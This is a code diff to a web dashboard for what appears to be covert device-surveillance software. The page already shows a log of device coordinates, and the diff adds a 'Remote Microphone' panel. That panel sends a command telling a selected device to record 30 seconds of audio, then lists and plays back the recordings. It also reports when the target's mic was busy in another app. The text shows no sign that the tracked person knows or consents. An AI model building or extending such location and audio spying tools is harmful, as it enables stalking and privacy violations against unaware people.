@@ -49,22 +49,35 @@
 
         <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
             
-            <!-- Left Column: Data Table -->
-            <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200 lg:col-span-1 flex flex-col h-[500px]">
-                <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Raw Coordinate Log</p>
-                <div class="overflow-y-auto scroller pr-2 flex-1">
-                    <table class="w-full text-left border-collapse">
-                        <thead>
-                            <tr class="text-xs text-gray-400 border-b border-gray-100">
-                                <th class="pb-2 font-semibold">Time</th>
-                                <th class="pb-2 font-semibold">Lat</th>
-                                <th class="pb-2 font-semibold">Lon</th>
-                            </tr>
-                        </thead>
-                        <tbody id="history-table" class="text-sm text-gray-600">
-                            <!-- Dynamic Rows -->
-                        </tbody>
-                    </table>
+            <!-- Left Column: Data Table and Audio -->
+            <div class="flex flex-col gap-6 lg:col-span-1">
+                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200 flex flex-col h-[500px]">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Raw Coordinate Log</p>
+                    <div class="overflow-y-auto scroller pr-2 flex-1">
+                        <table class="w-full text-left border-collapse">
+                            <thead>
+                                <tr class="text-xs text-gray-400 border-b border-gray-100">
+                                    <th class="pb-2 font-semibold">Time</th>
+                                    <th class="pb-2 font-semibold">Lat</th>
+                                    <th class="pb-2 font-semibold">Lon</th>
+                                </tr>
+                            </thead>
+                            <tbody id="history-table" class="text-sm text-gray-600">
+                                <!-- Dynamic Rows -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Surveillance Audio Panel -->
+                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Remote Microphone</p>
+                    <button onclick="requestAudio()" id="audio-btn" class="w-full bg-red-600 text-white font-bold py-3 rounded-xl hover:bg-red-500 transition shadow mb-4">
+                        Record 30s Audio
+                    </button>
+                    <div id="audio-list" class="flex flex-col gap-3 max-h-48 overflow-y-auto scroller pr-2">
+                        <!-- Dynamic Audio Records -->
+                    </div>
                 </div>
             </div>
 
@@ -186,15 +199,78 @@
             }
         }
 
+        async function requestAudio() {
+            const activeDevice = selectEl.value;
+            if(!activeDevice) return;
+            const btn = document.getElementById('audio-btn');
+            btn.textContent = "Command Sent (Waiting 30s...)";
+            btn.classList.replace('bg-red-600', 'bg-gray-500');
+            btn.disabled = true;
+
+            const fd = new FormData();
+            fd.append('device_id', activeDevice);
+            fd.append('record_audio', 1);
+            
+            try {
+                await fetch('/set_record_audio', { method: 'POST', body: fd});
+            } catch (e) {
+                console.error(e);
+            }
+
+            setTimeout(() => {
+                btn.textContent = "Record 30s Audio";
+                btn.classList.replace('bg-gray-500', 'bg-red-600');
+                btn.disabled = false;
+                fetchAudioList();
+            }, 35000);
+        }
+
+        async function fetchAudioList() {
+            const activeDevice = selectEl.value;
+            if(!activeDevice) return;
+            try {
+                const res = await fetch(`/audio_files?device_id=${encodeURIComponent(activeDevice)}`);
+                const data = await res.json();
+                const listEl = document.getElementById('audio-list');
+                listEl.innerHTML = '';
+                if(data.files && data.files.length > 0) {
+                    data.files.forEach(f => {
+                        const filename = f.split('/').pop();
+                        // Extract timestamp string from filename for a nice label
+                        const timeStr = new Date(parseInt(filename.split('_')[1].split('.')[0]) * 1000).toLocaleString();
+                        
+                        if (filename.includes("BUSY")) {
+                            listEl.innerHTML += `
+                            <div class="bg-red-50 border border-red-200 rounded-lg p-2 text-center text-red-600 text-xs font-bold shadow-sm">
+                                🚫 ${timeStr} - Mic was in use by another app!
+                            </div>`;
+                        } else {
+                            listEl.innerHTML += `
+                            <div class="bg-gray-50 border border-gray-200 rounded-lg p-2">
+                                <p class="text-[10px] text-gray-500 font-bold mb-1">${timeStr}</p>
+                                <audio controls class="w-full h-8" src="${f}"></audio>
+                            </div>`;
+                        }
+                    });
+                } else {
+                    listEl.innerHTML = '<p class="text-xs text-gray-400 text-center py-2">No recordings yet.</p>';
+                }
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
         async function init() {
             await fetchAvailableDevices();
             await fetchHistory();
+            fetchAudioList();
             
             // Poll for history every 3 seconds
             setInterval(() => {
                 if (!document.hidden) {
                     fetchAvailableDevices();
                     fetchHistory();
+                    fetchAudioList();
                 }
             }, 3000);
         }
@@ -203,6 +279,7 @@
             currentDataHash = "";
             isFirstLoad = true;
             fetchHistory();
+            fetchAudioList();
         });
         init();
     </script>
